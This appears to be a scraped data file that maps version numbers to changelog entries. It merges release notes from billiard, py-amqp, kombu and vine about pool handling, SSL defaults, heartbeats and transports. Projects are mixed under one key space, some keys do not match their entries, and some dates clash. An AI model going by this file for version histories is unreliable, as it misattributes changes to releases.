detect that a process exited.\n\n\n", "3.3.0.10": "---------------------\n\n- Windows: Fixed problem with missing ``WAITABANDONED_0``\n\n    Fix contributed by Matthias Wagner\n\n- Windows: PipeConnection can now be inherited.\n\n    Fix contributed by Matthias Wagner\n\n", "3.3.0.9": "--------------------\n\n- Temporary workaround for Celery maxtasksperchild issue.\n\n    Fix contributed by Ionel Cristian Maries.\n\n", "3.3.0.8": "--------------------\n\n- Now also sets ``multiprocessing.current_process`` for compatibility\n  with loggings ``processName`` field.\n\n", "3.3.0.7": "--------------------\n\n- Fixed compatibility with PyPy 2.1 + 2.2.\n\n- Fixed problem in pypy detection.\n\n    Fix contributed by Tin Tvrtkovic.\n\n- Now uses ``ctypes.find_library`` instead of hardcoded path to find\n  the macOS CoreServices framework.\n\n    Fix contributed by Moritz Kassner.\n\n\n", "3.3.0.6": "--------------------\n\n- Now works without C extension again.\n\n- New ``_billiard.read(fd, buffer, [len, ])`` function\n  implements os.read with buffer support (new buffer API)\n\n- New pure-python implementation of ``Connection.send_offset``.\n\n", "3.3.0.5": "--------------------\n\n- All platforms except for Windows/PyPy/Jython now requires the C extension.\n\n", "3.3.0.4": "--------------------\n\n- Fixed problem with Python3 and setblocking.\n\n", "3.3.0.3": "--------------------\n\n- Now works on Windows again.\n\n", "3.3.0.2": "--------------------\n\n- ApplyResult.terminate() may be set to signify that the job\n  must not be executed.  It can be used in combination with\n  Pool.terminate_job.\n\n- Pipe/_SimpleQueue: Now supports rnonblock/wnonblock arguments\n  to set the read or write end of the pipe to be nonblocking.\n\n- Pool: Log message included exception info but exception happened\n  in another process so the resulting traceback was wrong.\n\n- Pool: Worker process can now prepare results before they are sent\n  back to the main process (using ``Worker.prepare_result``).\n\n", "3.3.0.1": "--------------------\n\n- Pool: New ``correlation_id`` argument to ``apply_async`` can be\n  used to set a related id for the ``ApplyResult`` object returned:\n\n    >>> r = pool.apply_async(target, args, kwargs, correlation_id='foo')\n    >>> r.correlation_id\n    'foo'\n\n- Pool: New callback `on_process_exit` is called when a pool\n  process exits, with signature ``(pid, exitcode)``.\n\n    Contributed by Daniel M. Taub.\n\n- Pool: Improved the too many restarts detection.\n\n", "3.3.0.0": "--------------------\n\n- Dual code base now runs on Python 2.6+ and Python 3.\n\n- No longer compatible with Python 2.5\n\n- Includes many changes from multiprocessing in 3.4.\n\n- Now uses ``time.monotonic`` when available, also including\n  fallback implementations for Linux and macOS.\n\n- No longer cleans up after receiving SIGILL, SIGSEGV or SIGFPE\n\n    Contributed by Kevin Blackham\n\n- ``Finalize`` and ``register_after_fork`` is now aliases to multiprocessing.\n\n    It's better to import these from multiprocessing directly now\n    so that there aren't multiple registries.\n\n- New `billiard.queues._SimpleQueue` that does not use semaphores.\n\n- Pool: Can now be extended to support using multiple IPC queues.\n\n- Pool: Can now use async I/O to write to pool IPC queues.\n\n- Pool: New ``Worker.on_loop_stop`` handler can be used to add actions\n  at pool worker process shutdown.\n\n    Note that, like all finalization handlers, there is no guarantee that\n    this will be executed.\n\n    Contributed by dmtaub.\n\n", "2.7.3.30": "---------------------\n\n- Fixed ImportError in billiard._ext\n\n", "2.7.3.29": "---------------------\n\n- Compilation: Fixed improper handling of HAVE_SEM_OPEN (Issue 55)\n\n    Fix contributed by Krzysztof Jagiello.\n\n- Process now releases logging locks after fork.\n\n    This previously happened in Pool, but it was done too late\n    as processes logs when they bootstrap.\n\n- Pool.terminate_job now ignores `No such process` errors.\n\n- billiard.Pool entrypoint did not support new arguments\n  to billiard.pool.Pool\n\n- Connection inbound buffer size increased from 1kb to 128kb.\n\n- C extension cleaned up by properly adding a namespace to symbols.\n\n- _exit_function now works even if thread wakes up after gc collect.\n\n", "2.7.3.28": "---------------------\n\n- Pool: Fixed regression that disabled the deadlock\n  fix in 2.7.3.24\n\n- Pool: RestartFreqExceeded could be raised prematurely.\n\n- Process: Include pid in startup and process INFO logs.\n\n", "2.7.3.27": "---------------------\n\n- Manager now works again.\n\n- Python 3 fixes for billiard.connection.\n\n- Fixed invalid argument bug when running on Python 3.3\n\n    Fix contributed by Nathan Wan.\n\n- Ignore OSError when setting up signal handlers.\n\n", "2.7.3.26": "---------------------\n\n- Pool: Child processes must ignore SIGINT.\n\n", "2.7.3.25": "---------------------\n\n- Pool: 2.7.3.24 broke support for subprocesses (Issue 48).\n\n    Signals that should be ignored were instead handled\n    by terminating.\n\n", "2.7.3.24": "---------------------\n\n- Pool:  Make sure finally blocks are called when process exits\n  due to a signal.\n\n    This fixes a deadlock problem when the process is killed\n    while having acquired the shared semaphore.  However, this solution\n    does not protect against the processes being killed, a more elaborate\n    solution is required for that. Hopefully this will be fixed soon in a\n    later version.\n\n- Pool:  Can now use GDB to debug pool child processes.\n\n- Fixes Python 3 compatibility problems.\n\n    Contributed by Albertas Agejevas.\n\n", "2.7.3.23": "---------------------\n\n- Windows: Now catches SystemExit from setuptools while trying to build\n  the C extension (Issue 41).\n\n", "2.7.3.22": "---------------------\n\n- Pool: apply_async now supports a ``callbacks_propagate`` keyword\n  argument that can be a tuple of exceptions to propagate in callbacks.\n  (callback, errback, accept_callback, timeout_callback).\n\n- Errors are no longer logged for OK and recycle exit codes.\n\n    This would cause normal maxtasksperchild recycled process\n    to log an error.\n\n- Fixed Python 2.5 compatibility problem (Issue 33).\n\n- FreeBSD: Compilation now disables semaphores if Python was built\n  without it (Issue 40).\n\n    Contributed by William Grzybowski\n\n", "2.7.3.21": "---------------------\n\n- Fixed typo EX_REUSE -> EX_RECYCLE\n\n- Code now conforms to new pep8.py rules.\n\n", "2.7.3.20": "---------------------\n\n- Pool: Disable restart limit if maxR is not set.\n\n- Pool: Now uses os.kill instead of signal.signal.\n\n    Contributed by Lukasz Langa\n\n- Fixed name error in process.py\n\n- Pool: ApplyResult.get now properly raises exceptions.\n\n    Fix contributed by xentac.\n\n", "2.7.3.19": "---------------------\n\n- Fixes problem at shutdown when gc has collected symbols.\n\n- Pool now always uses _kill for Py2.5 compatibility on Windows (Issue 32).\n\n- Fixes Python 3 compatibility issues\n\n", "2.7.3.18": "---------------------\n\n- [Pool] Fix for check_timeouts if not set.\n\n    Fix contributed by Dmitry Sukhov\n\n- Fixed pickle problem with Traceback.\n\n    Code.frame.__loader__ is now ignored as it may be set to\n    an unpickleable object.\n\n- The Django old-layout warning was always showing.\n\n", "2.7.3.17": "---------------------\n\n- Fixes typo\n\n", "2.7.3.16": "---------------------\n\n- Windows: Fixes for SemLock._rebuild (Issue 24).\n\n- Pool: Job terminated with terminate_job now raises\n  billiard.exceptions.Terminated.\n\n", "2.7.3.15": "---------------------\n\n- Windows: Fixes unpickling of SemLock when using fallback.\n\n- Windows: Fixes installation when no C compiler.\n\n", "2.7.3.14": "---------------------\n\n- Installation now works again for Python 3.\n\n", "2.7.3.13": "---------------------\n\n- Merged with Python trunk (many authors, many fixes: see Python changelog in\n  trunk).\n\n- Using execv now also works with older Django projects using setup_environ\n  (Issue 10).\n\n- Billiard now installs with a warning that the C extension could not be built\n  if a compiler is not installed or the build fails in some other way.\n\n    It really is recommended to have the C extension installed when running\n    with force execv, but this change also makes it easier to install.\n\n- Pool: Hard timeouts now sends KILL shortly after TERM so that C extensions\n  cannot block the signal.\n\n    Python signal handlers are called in the interpreter, so they cannot\n    be called while a C extension is blocking the interpreter from running.\n\n- Now uses a timeout value for Thread.join that doesn't exceed the maximum\n  on some platforms.\n\n- Fixed bug in the SemLock fallback used when C extensions not installed.\n\n    Fix contributed by Mher Movsisyan.\n\n- Pool: Now sets a Process.index attribute for every process in the pool.\n\n    This number will always be between 0 and concurrency-1, and\n    can be used to e.g. create a logfile for each process in the pool\n    without creating a new logfile whenever a process is replaced.\n\n", "2.7.3.12": "---------------------\n\n- Fixed Python 2.5 compatibility issue.\n\n- New Pool.terminate_job(pid) to terminate a job without raising WorkerLostError\n\n", "2.7.3.11": "---------------------\n\n- Adds support for FreeBSD 7+\n\n    Fix contributed by koobs.\n\n- Pool: New argument ``allow_restart`` is now required to enable\n  the pool process sentinel that is required to restart the pool.\n\n    It's disabled by default, which reduces the number of file\n    descriptors/semaphores required to run the pool.\n\n- Pool: Now emits a warning if a worker process exited with error-code.\n\n    But not if the error code is 155, which is now returned if the worker\n    process was recycled (maxtasksperchild).\n\n- Python 3 compatibility fixes.\n\n- Python 2.5 compatibility fixes.\n\n", "2.7.3.10": "---------------------\n\n- The ``TimeLimitExceeded`` exception string representation\n  only included the seconds as a number, it now gives a more human\n  friendly description.\n\n- Fixed typo in ``LaxBoundedSemaphore.shrink``.\n\n- Pool: ``ResultHandler.handle_event`` no longer requires\n  any arguments.\n\n- setup.py bdist now works\n\n", "2.7.3.9": "--------------------\n\n- Environment variable ``MP_MAIN_FILE`` envvar is now set to\n  the path of the ``__main__`` module when execv is enabled.\n\n- Pool: Errors occurring in the TaskHandler are now reported.\n\n", "2.7.3.8": "--------------------\n\n- Can now be installed on Py 3.2\n\n- Issue 12091: simplify ApplyResult and MapResult with threading.Event\n\n  Patch by Charles-Francois Natali\n\n- Pool: Support running without TimeoutHandler thread.\n\n    - The with_*_thread arguments has also been replaced with\n      a single `threads=True` argument.\n\n    - Two new pool callbacks:\n\n        - ``on_timeout_set(job, soft, hard)``\n\n            Applied when a task is executed with a timeout.\n\n        - ``on_timeout_cancel(job)``\n\n            Applied when a timeout is cancelled (the job completed)\n\n", "2.7.3.7": "--------------------\n\n- Fixes Python 2.5 support.\n\n", "2.7.3.6": "--------------------\n\n- Pool: Can now be used in an event loop, without starting the supporting\n  threads (TimeoutHandler still not supported)\n\n    To facilitate this the pool has gained the following keyword arguments:\n\n        - ``with_task_thread``\n        - ``with_result_thread``\n        - ``with_supervisor_thread``\n        - ``on_process_up``\n\n            Callback called with Process instance as argument\n            whenever a new worker process is added.\n\n            Used to add new process fds to the eventloop::\n\n                def on_process_up(proc):\n                    hub.add_reader(proc.sentinel, pool.maintain_pool)\n\n        - ``on_process_down``\n\n            Callback called with Process instance as argument\n            whenever a new worker process is found dead.\n\n            Used to remove process fds from the eventloop::\n\n                def on_process_down(proc):\n                    hub.remove(proc.sentinel)\n\n        - ``semaphore``\n\n            Sets the semaphore used to protect from adding new items to the\n            pool when no processes available.  The default is a threaded\n            one, so this can be used to change to an async semaphore.\n\n    And the following attributes::\n\n        - ``readers``\n\n            A map of ``fd`` -> ``callback``, to be registered in an eventloop.\n            Currently this is only the result outqueue with a callback\n            that processes all currently incoming results.\n\n    And the following methods::\n\n        - ``did_start_ok``\n\n            To be called after starting the pool, and after setting up the\n            eventloop with the pool fds, to ensure that the worker processes\n            didn't immediately exit caused by an error (internal/memory).\n\n        - ``maintain_pool``\n\n            Public version of ``_maintain_pool`` that handles max restarts.\n\n- Pool: Process too frequent restart protection now only counts if the process\n  had a non-successful exit-code.\n\n    This to take into account the maxtasksperchild option, and allowing\n    processes to exit cleanly on their own.\n\n- Pool: New options max_restart + max_restart_freq\n\n    This means that the supervisor can't restart processes\n    faster than max_restart' times per max_restart_freq seconds\n    (like the Erlang supervisor maxR & maxT settings).\n\n    The pool is closed and joined if the max restart\n    frequency is exceeded, where previously it would keep restarting\n    at an unlimited rate, possibly crashing the system.\n\n    The current default value is to stop if it exceeds\n    100 * process_count restarts in 1 seconds.  This may change later.\n\n    It will only count processes with an unsuccessful exit code,\n    this is to take into account the ``maxtasksperchild`` setting\n    and code that voluntarily exits.\n\n- Pool: The ``WorkerLostError`` message now includes the exit-code of the\n  process that disappeared.\n\n\n", "2.7.3.5": "--------------------\n\n- Now always cleans up after ``sys.exc_info()`` to avoid\n  cyclic references.\n\n- ExceptionInfo without arguments now defaults to ``sys.exc_info``.\n\n- Forking can now be disabled using the\n  ``MULTIPROCESSING_FORKING_DISABLE`` environment variable.\n\n    Also this envvar is set so that the behavior is inherited\n    after execv.\n\n- The semaphore cleanup process started when execv is used\n  now sets a useful process name if the ``setproctitle``\n  module is installed.\n\n- Sets the ``FORKED_BY_MULTIPROCESSING``\n  environment variable if forking is disabled.\n\n\n", "2.7.3.4": "--------------------\n\n- Added `billiard.ensure_multiprocessing()`\n\n    Raises NotImplementedError if the platform does not support\n    multiprocessing (e.g. Jython).\n\n\n", "2.7.3.3": "--------------------\n\n- PyPy now falls back to using its internal _multiprocessing module,\n  so everything works except for forking_enable(False) (which\n  silently degrades).\n\n- Fixed Python 2.5 compat. issues.\n\n- Uses more with statements\n\n- Merged some of the changes from the Python 3 branch.\n\n", "2.7.3.2": "--------------------\n\n- Now installs on PyPy/Jython (but does not work).\n\n", "2.7.3.1": "--------------------\n\n- Python 2.5 support added.\n\n", "2.7.3.0": "--------------------\n\n- Updated from Python 2.7.3\n\n- Python 2.4 support removed, now only supports 2.5, 2.6 and 2.7.\n  (may consider py3k support at some point).\n\n- Pool improvements from Celery.\n\n- no-execv patch added (https://bugs.python.org/issue8713)\n\n\nChanges\n=======\n\npy-amqp is fork of amqplib used by Kombu containing additional features and improvements.\nThe previous amqplib changelog is here:\nhttp://code.google.com/p/py-amqplib/source/browse/CHANGES\n\n\n.. _version-5.2.0:\n\n", "5.2.0": "=====\n\n:release-date: 2021-11-08 7.15 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Prevent from subscribing to empty channels (7040)\n- fix register_task method.\n- Fire task failure signal on final reject (6980)\n- Limit pymongo version: <3.12.1 (7041)\n- Bump min kombu version to 5.2.1\n\n.. _version-5.2.0rc2:\n\n", "5.1.1": "=====\n:release-date: 2022-04-17 12:45 P.M. UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Use AF_UNSPEC for name resolution (389).\n\n\n.. _version-5.1.0:\n\n", "5.1.0": "=====\n:release-date: 2023-11-05 2:45 P.M UTC+6:00\n:release-by: ASIF SAIF UDDIN\n\n- Dropped Python 3.6 support.\n- Added new Python versions support.\n- Dropped old dependencies.\n- Added new GHA based CI.\n- Added slots support and impproved dynamic assignment.\n\n\n  Contributed by **Asif Saif Uddin**\n\n\n.. _version-5.0.0:\n\n", "5.0.9": "=====\n:release-date: 2021-12-20 11:00 A.M. UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Append to _used_channel_ids in _used_channel_ids\n\n\n.. _version-5.0.8:\n\n", "5.0.8": "=====\n:release-date: 2021-12-19 11:15 A.M. UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Reduce memory usage of Connection (377)\n- Add additional error handling around code where an OSError\n  may be raised on failed connections. Fixes (378)\n\n\n.. _version-5.0.7:\n\n", "5.0.7": "=====\n:release-date: 2021-12-13 15:45 P.M. UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Remove dependency to case\n- Bugfix: not closing socket after server disconnect\n\n\n.. _version-5.0.6:\n\n", "5.0.6": "=====\n:release-date: 2021-04-01 10:45 A.M. UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Change the order in which context.check_hostname and context.verify_mode get set\n  in SSLTransport._wrap_socket_sni. Fixes bug introduced in 5.0.3 where setting\n  context.verify_mode = ssl.CERT_NONE would raise\n  \"ValueError: Cannot set verify_mode to CERT_NONE when check_hostname is enabled.\"\n  Setting context.check_hostname prior to setting context.verify_mode resolves the\n  issue.\n- Remove TCP_USER_TIMEOUT option for Solaris (355)\n- Pass long_description to setup() (353)\n- Fix for tox-docker 2.0\n- Moved to GitHub actions CI (359)\n\n.. _version-5.0.5:\n\n", "5.0.5": "=====\n:release-date: 2021-01-28 4:30 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n-  Removed mistakenly introduced code which was causing import errors\n\n\n\n.. _version-5.0.4:\n\n", "5.0.4": "=====\n:release-date: 2021-01-28 2:30 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n-  Add missing load_default_certs() call to fix a regression in v5.0.3 release. (350)\n\n\n.. _version-5.0.3:\n\n", "5.0.3": "=====\n:release-date: 2021-01-19 9:00 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Change the default value of ssl_version to None. When not set, the\n  proper value between ssl.PROTOCOL_TLS_CLIENT and ssl.PROTOCOL_TLS_SERVER\n  will be selected based on the param server_side in order to create\n  a TLS Context object with better defaults that fit the desired\n  connection side.\n\n- Change the default value of cert_reqs to None. The default value\n  of ctx.verify_mode is ssl.CERT_NONE, but when ssl.PROTOCOL_TLS_CLIENT\n  is used, ctx.verify_mode defaults to ssl.CERT_REQUIRED.\n\n- Fix context.check_hostname logic. Checking the hostname depends on\n  having support of the SNI TLS extension and being provided with a\n  server_hostname value. Another important thing to mention is that\n  enabling hostname checking automatically sets verify_mode from\n  ssl.CERT_NONE to ssl.CERT_REQUIRED in the stdlib ssl and it cannot\n  be set back to ssl.CERT_NONE as long as hostname checking is enabled.\n\n- Refactor the SNI tests to test one thing at a time and removing some\n  tests that were being repeated over and over.\n\n\n\n.. _version-5.0.2:\n\n", "5.0.2": "=====\n:release-date: 2020-09-06 6:30 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Bump required amqp version to 5.0.0.\n\n.. _version-5.0.1:\n\n", "5.0.1": "=====\n:release-date: 2020-08-23 19:10 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Removed kombu.five from the reference documentation since it no longer exists\n- Adjusted the stable documentation's version in Sphinx's configuration since that was overlooked in the latest release\n\n.. _version-5.0.0:\n\n", "5.0.0": "=====\n:release-date: 2020-09-06 6:10 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Dropped Python 3.5 support.\n\n  Contributed by **Omer Katz**\n\n.. _version-5.0.0a1:\n\n", "5.0.0b1": "=======\n:release-date: 2020-09-01 6:20 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Dropped Python 3.5 support.\n\n  Contributed by **Omer Katz**\n\n- Removed additional compatibility code.\n\n  Contributed by **Omer Katz**\n\n.. _version-5.0.0a1:\n\n", "5.0.0a1": "=======\n:release-date: 2019-04-01 4:30 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Dropped Python 2.x support.\n\n  Contributed by **Omer Katz**\n\n- Dropped Python 3.4 support.\n\n  Contributed by **Omer Katz**\n\n- Removed the :mod:`vine.five` module.\n\n  Contributed by **Omer Katz**\n\n- Removed the :mod:`vine.backports.weakref_backports` module.\n\n  Contributed by **Omer Katz**\n\n.. _version-1.3.0:\n\n", "2.6.1": "=====\n:release-date: 2020-07-31 10.30 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Fix buffer overflow in frame_writer after frame_max is increased. `frame_writer`\nallocates a `bytearray` on initialization with a length based on the `connection.frame_max`\nvalue. If `connection.frame_max` is changed to a larger value, this causes an\nerror like `pack_into requires a buffer of at least 408736 bytes`.\n\n\n.. _version-2.6.0:\n\n", "2.6.0": "=====\n:release-date: 20-06-01 12.00 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Implement speedups in cython (311)\n- Updated some tests & code improvements\n- Separate logger for Connection.heartbeat_tick method\n- Cython generic content (315)\n- Improve documentation a_global parameter of basic_qos() method.\n- Fix saving partial read buffer on windows during socket timeout. (321)\n- Fix deserialization of long string field values that are not utf-8.\n- Added simple cythonization of abstract_channel.py\n- Speedups of serialization.py are more restrictive\n\n.. _version-2.5.2:\n\n", "2.5.2": "=====\n:release-date: 2012-11-29 12:35 P.M UTC\n:release-by: Ask Solem\n\n- [Redis] Fixed connection leak and added a new 'max_connections' transport\n  option.\n\n.. _version-2.5.1:\n\n", "2.5.1": "=====\n:release-date: 2012-11-28 12:45 P.M UTC\n:release-by: Ask Solem\n\n- Fixed bug where return value of Queue.as_dict could not be serialized with\n  JSON (Issue 177).\n\n.. _version-2.5.0:\n\n", "2.5.0": "=====\n:release-date: 2012-11-27 04:00 P.M UTC\n:release-by: Ask Solem\n\n- `py-amqp`_ is now the new default transport, replacing ``amqplib``.\n\n    The new `py-amqp`_ library is a fork of amqplib started with the\n    following goals:\n\n        - Uses AMQP 0.9.1 instead of 0.8\n        - Support for heartbeats (Issue 79 + Issue 131)\n        - Automatically revives channels on channel errors.\n        - Support for all RabbitMQ extensions\n            - Consumer Cancel Notifications (Issue 131)\n            - Publisher Confirms (Issue 131).\n            - Exchange-to-exchange bindings: ``exchange_bind`` / ``exchange_unbind``.\n        - API compatible with :mod:`librabbitmq` so that it can be used\n          as a pure-python replacement in environments where rabbitmq-c cannot\n          be compiled.  librabbitmq will be updated to support all the same\n          features as py-amqp.\n\n- Support for using multiple connection URL's for failover.\n\n    The first argument to :class:`~kombu.Connection` can now be a list of\n    connection URLs:\n\n    .. code-block:: python\n\n        Connection(['amqp://foo', 'amqp://bar'])\n\n    or it can be a single string argument with several URLs separated by\n    semicolon:\n\n    .. code-block:: python\n\n        Connection('amqp://foo;amqp://bar')\n\n    There is also a new keyword argument ``failover_strategy`` that defines\n    how :meth:`~kombu.Connection.ensure_connection`/\n    :meth:`~kombu.Connection.ensure`/:meth:`kombu.Connection.autoretry` will\n    reconnect in the event of connection failures.\n\n    The default reconnection strategy is ``round-robin``, which will simply\n    cycle through the list forever, and there's also a ``shuffle`` strategy\n    that will select random hosts from the list.  Custom strategies can also\n    be used, in that case the argument must be a generator yielding the URL\n    to connect to.\n\n    Example:\n\n    .. code-block:: python\n\n        Connection('amqp://foo;amqp://bar')\n\n- Now supports PyDev, PyCharm, pylint and other static code analysis tools.\n\n- :class:`~kombu.Queue` now supports multiple bindings.\n\n    You can now have multiple bindings in the same queue by having\n    the second argument be a list:\n\n    .. code-block:: python\n\n        from kombu import binding, Queue\n\n        Queue('name', [\n            binding(Exchange('E1'), routing_key='foo'),\n            binding(Exchange('E1'), routing_key='bar'),\n            binding(Exchange('E2'), routing_key='baz'),\n        ])\n\n    To enable this, helper methods have been added:\n\n        - :meth:`~kombu.Queue.bind_to`\n        - :meth:`~kombu.Queue.unbind_from`\n\n    Contributed by Rumyana Neykova.\n\n- Custom serializers can now be registered using Setuptools entry-points.\n\n    See :ref:`serialization-entrypoints`.\n\n- New :class:`kombu.common.QoS` class used as a thread-safe way to manage\n  changes to a consumer or channels prefetch_count.\n\n    This was previously an internal class used in Celery now moved to\n    the :mod:`kombu.common` module.\n\n- Consumer now supports a ``on_message`` callback that can be used to process\n  raw messages (not decoded).\n\n    Other callbacks specified using the ``callbacks`` argument, and\n    the ``receive`` method will be not be called when a on message callback\n    is present.\n\n- New utility :func:`kombu.common.ignore_errors` ignores connection and\n  channel errors.\n\n    Must only be used for cleanup actions at shutdown or on connection loss.\n\n- Support for exchange-to-exchange bindings.\n\n    The :class:`~kombu.Exchange` entity gained ``bind_to``\n    and ``unbind_from`` methods:\n\n    .. code-block:: python\n\n        e1 = Exchange('A')(connection)\n        e2 = Exchange('B')(connection)\n\n        e2.bind_to(e1, routing_key='rkey', arguments=None)\n        e2.unbind_from(e1, routing_key='rkey', arguments=None)\n\n    This is currently only supported by the ``pyamqp`` transport.\n\n    Contributed by Rumyana Neykova.\n\n.. _version-2.4.10:\n\n", "2.4.2": "=====\n:release-date: 2012-08-24 05:00 P.M BST\n:release-by: Ask Solem\n\n- Having an empty transport name broke in 2.4.1.\n\n\n.. _version-2.4.1:\n\n", "2.4.1": "=====\n:release-date: 2012-08-24 04:00 P.M BST\n:release-by: Ask Solem\n\n- Redis: Fixed race condition that could cause the consumer to crash (Issue 151)\n\n    Often leading to the error message ``\"could not convert string to float\"``\n\n- Connection retry could cause an inifite loop (Issue 145).\n\n- The ``amqp`` alias is now resolved at runtime, so that eventlet detection\n  works even if patching was done later.\n\n.. _version-2.4.0:\n\n", "2.4.0": "=====\n:release-date: 2012-08-17 08:00 P.M BST\n:release-by: Ask Solem\n\n- New experimental :mod:`ZeroMQ <kombu.transport.zmq` transport.\n\n    Contributed by John Watson.\n\n- Redis: Ack timed-out messages were not restored when using the eventloop.\n\n- Now uses pickle protocol 2 by default to be cross-compatible with Python 3.\n\n    The protocol can also now be changed using the :envvar:`PICKLE_PROTOCOL`\n    environment variable.\n\n- Adds ``Transport.supports_ev`` attribute.\n\n- Pika: Queue purge was not working properly.\n\n    Fix contributed by Steeve Morin.\n\n- Pika backend was no longer working since Kombu 2.3\n\n    Fix contributed by Steeve Morin.\n\n.. _version-2.3.2:\n\n", "2.3.2": "=====\n:release-date: 2012-08-01 06:00 P.M BST\n:release-by: Ask Solem\n\n- Fixes problem with deserialization in Python 3.\n\n.. _version-2.3.1:\n\n", "2.3.1": "=====\n:release-date: 2012-08-01 04:00 P.M BST\n:release-by: Ask Solem\n\n- librabbitmq: Can now handle messages that does not have a\n  content_encoding/content_type set (Issue 149).\n\n    Fix contributed by C Anthony Risinger.\n\n- Beanstalk: Now uses localhost by default if the URL does not contain a host.\n\n.. _version-2.3.0:\n\n", "2.3.0": "=====\n:release-date: 2012-07-24 03:50 P.M BST\n:release-by: Ask Solem\n\n- New ``pyamqp://`` transport!\n\n    The new `py-amqp`_ library is a fork of amqplib started with the\n    following goals:\n\n        - Uses AMQP 0.9.1 instead of 0.8\n        - Should support all RabbitMQ extensions\n        - API compatible with :mod:`librabbitmq` so that it can be used\n          as a pure-python replacement in environments where rabbitmq-c cannot\n          be compiled.\n\n    .. _`py-amqp`: https://amqp.readthedocs.io/\n\n    If you start using use py-amqp instead of amqplib you can enjoy many\n    advantages including:\n\n        - Heartbeat support (Issue 79 + Issue 131)\n        - Consumer Cancel Notifications (Issue 131)\n        - Publisher Confirms\n\n    amqplib has not been updated in a long while, so maintaining our own fork\n    ensures that we can quickly roll out new features and fixes without\n    resorting to monkey patching.\n\n    To use the py-amqp transport you must install the :mod:`amqp` library:\n\n    .. code-block:: console\n\n        $ pip install amqp\n\n    and change the connection URL to use the correct transport:\n\n    .. code-block:: pycon\n\n        >>> conn = Connection('pyamqp://guest:guestlocalhost//')\n\n\n    The ``pyamqp://`` transport will be the default fallback transport\n    in Kombu version 3.0, when :mod:`librabbitmq` is not installed,\n    and librabbitmq will also be updated to support the same features.\n\n- Connection now supports heartbeat argument.\n\n    If enabled you must make sure to manually maintain heartbeats\n    by calling the ``Connection.heartbeat_check`` at twice the rate\n    of the specified heartbeat interval.\n\n    E.g. if you have ``Connection(heartbeat=10)``,\n    then you must call ``Connection.heartbeat_check()`` every 5 seconds.\n\n    if the server has not sent heartbeats at a suitable rate then\n    the heartbeat check method must raise an error that is listed\n    in ``Connection.connection_errors``.\n\n    The attribute ``Connection.supports_heartbeats`` has been added\n    for the ability to inspect if a transport supports heartbeats\n    or not.\n\n    Calling ``heartbeat_check`` on a transport that does\n    not support heartbeats results in a noop operation.\n\n- SQS: Fixed bug with invalid characters in queue names.\n\n    Fix contributed by Zach Smith.\n\n- utils.reprcall: Fixed typo where kwargs argument was an empty tuple by\n  default, and not an empty dict.\n\n.. _version-2.2.6:\n\n", "2.2.2": "=====\n:release-date: 2012-06-22 02:30 P.M BST\n:release-by: Ask Solem\n\n- Now depends on :mod:`anyjson` 0.3.3\n\n- Json serializer: Now passes :class:`buffer` objects directly,\n  since this is supported in the latest :mod:`anyjson` version.\n\n- Fixes blocking epoll call if timeout was set to 0.\n\n    Fix contributed by John Watson.\n\n- setup.py now takes requirements from the :file:`requirements/` directory.\n\n- The distribution directory :file:`contrib/` is now renamed to :file:`extra/`\n\n.. _version-2.2.1:\n\n", "2.2.1": "=====\n:release-date: 2012-06-21 01:00 P.M BST\n:release-by: Ask Solem\n\n- SQS: Default visibility timeout is now 30 minutes.\n\n    Since we have ack emulation the visibility timeout is\n    only in effect if the consumer is abrubtly terminated.\n\n- retry argument to ``Producer.publish`` now works properly,\n  when the declare argument is specified.\n\n- Json serializer: didn't handle buffer objects (Issue 135).\n\n    Fix contributed by Jens Hoffrichter.\n\n- Virtual: Now supports passive argument to ``exchange_declare``.\n\n- Exchange & Queue can now be bound to connections (which will use the default\n  channel):\n\n    .. code-block:: pycon\n\n        >>> exchange = Exchange('name')\n        >>> bound_exchange = exchange(connection)\n        >>> bound_exchange.declare()\n\n- ``SimpleQueue`` & ``SimpleBuffer`` can now be bound to connections (which\n  will use the default channel).\n\n- ``Connection.manager.get_bindings`` now works for librabbitmq and pika.\n\n- Adds new transport info attributes:\n\n    - ``Transport.driver_type``\n\n        Type of underlying driver, e.g. \"amqp\", \"redis\", \"sql\".\n\n    - ``Transport.driver_name``\n\n        Name of library used e.g. \"amqplib\", \"redis\", \"pymongo\".\n\n    - ``Transport.driver_version()``\n\n        Version of underlying library.\n\n.. _version-2.2.0:\n\n", "2.2.0": "=====\n:release-date: 2012-06-07 03:10 P.M BST\n:release-by: Ask Solem\n\n.. _v220-important:\n\nImportant Notes\n---------------\n\n- The canonical source code repository has been moved to\n\n    http://github.com/celery/kombu\n\n- Pidbox: Exchanges used by pidbox are no longer auto_delete.\n\n    Auto delete has been described as a misfeature,\n    and therefore we have disabled it.\n\n    For RabbitMQ users old exchanges used by pidbox must be removed,\n    these are named ``mailbox_name.pidbox``,\n    and ``reply.mailbox_name.pidbox``.\n\n    The following command can be used to clean up these exchanges:\n\n    .. code-block:: text\n\n        $ VHOST=/ URL=amqp:// python -c'import sys,kombu;[kombu.Connection(\n            sys.argv[-1]).channel().exchange_delete(x)\n                for x in sys.argv[1:-1]]' \\\n            $(sudo rabbitmqctl -q list_exchanges -p \"$VHOST\" \\\n            | grep \\.pidbox | awk '{print $1}') \"$URL\"\n\n    The :envvar:`VHOST` variable must be set to the target RabbitMQ virtual host,\n    and the :envvar:`URL` must be the AMQP URL to the server.\n\n- The ``amqp`` transport alias will now use :mod:`librabbitmq`\n  if installed.\n\n    `py-librabbitmq`_ is a fast AMQP client for Python\n    using the librabbitmq C library.\n\n    It can be installed by:\n\n    .. code-block:: console\n\n        $ pip install librabbitmq\n\n    It will not be used if the process is monkey patched by eventlet/gevent.\n\n.. _`py-librabbitmq`: https://github.com/celery/librabbitmq\n\n.. _v220-news:\n\nNews\n----\n\n- Redis: Ack emulation improvements.\n\n    Reducing the possibility of data loss.\n\n    Acks are now 